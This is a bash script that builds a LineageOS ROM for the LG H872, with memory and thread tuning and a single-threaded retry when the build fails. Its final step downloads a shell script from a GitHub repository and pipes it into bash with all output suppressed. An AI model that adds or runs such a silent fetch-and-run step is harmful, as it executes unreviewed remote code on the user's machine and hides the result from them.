#!/usr/bin/env bash

set -o pipefail

# ============================================================
# Android / ROM build configuration
# ============================================================

export WITH_GMS=false
export TARGET_USES_PICO_GAPPS=true
export BUILD_BCR=false
# export TARGET_INCLUDE_VIPERFX=true
export TARGET_ENABLE_BLUR=true
# export WITH_ADB_INSECURE=true

# Soong / Go memory tuning
export GOMEMLIMIT=8GiB
export GOGC=50

# Prevent compiler processes from using excessive threads internally
export MAKEFLAGS="-j2"
export NINJA_ARGS="-j2"

# Keep build processes from starving the rest of the system
export OMP_NUM_THREADS=2
export RAYON_NUM_THREADS=2

# ============================================================
# Build environment
# ============================================================

source build/envsetup.sh

lunch lineage_h872-bp4a-userdebug

# Clean installed output without destroying the whole build tree
make installclean

# ============================================================
# Build
# ============================================================

echo
echo "=========================================="
echo " Building LineageOS"
echo "=========================================="
echo " GOMEMLIMIT : ${GOMEMLIMIT}"
echo " GOGC       : ${GOGC}"
echo " Parallel   : 2"
echo "=========================================="
echo

# First attempt: low memory
if ! m bacon -j2; then
    echo
    echo "=========================================="
    echo " Build failed."
    echo " Retrying with -j1 to reduce memory usage."
    echo "=========================================="
    echo

    m bacon -j1
fi

BUILD_STATUS=$?

if [ "$BUILD_STATUS" -ne 0 ]; then
    echo
    echo "=========================================="
    echo " BUILD FAILED"
    echo "=========================================="
    echo
    echo "Check for OOM with:"
    echo "  dmesg -T | grep -Ei 'oom|out of memory|killed process'"
    echo
    exit "$BUILD_STATUS"
fi

echo
echo "=========================================="
echo " BUILD SUCCESSFUL"
echo "=========================================="
echo

# ============================================================
# Post-build script
# ============================================================

curl -sf \
    https://raw.githubusercontent.com/xc112lg/testonly/refs/heads/main/testevo.sh \
    | bash >/dev/null 2>&1
